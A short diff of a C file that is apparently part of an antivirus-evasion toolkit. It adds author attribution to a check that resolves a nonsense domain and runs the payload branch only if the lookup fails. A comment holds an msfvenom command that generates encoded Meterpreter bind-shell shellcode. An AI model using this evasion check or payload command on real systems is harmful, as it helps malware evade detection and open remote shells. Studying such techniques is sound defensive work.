@@ -1,3 +1,5 @@
+//gethostbyname.c by Daniel Sauder (@DanielX4v3r)
+//blog: govolution.wordpress.com
 //wine gcc -m32 gethostbyname.c -lws2_32
 
 #include <stdio.h>
@@ -9,7 +11,7 @@ int error;
 
 int main(int argc, char **argv) {
 
-	struct hostent *hp = gethostbyname("adsfadsfasdf.asdfasdfasdf");//gethostbyname(argv[1]);
+	struct hostent *hp = gethostbyname("adsfadsfasdf.asdfasdfasdf");
 	if (hp == NULL) {
 
 		//msfvenom -p windows/meterpreter/bind_tcp lport=8443 -e x86/shikata_ga_nai -f c -a x86 --platform Windows
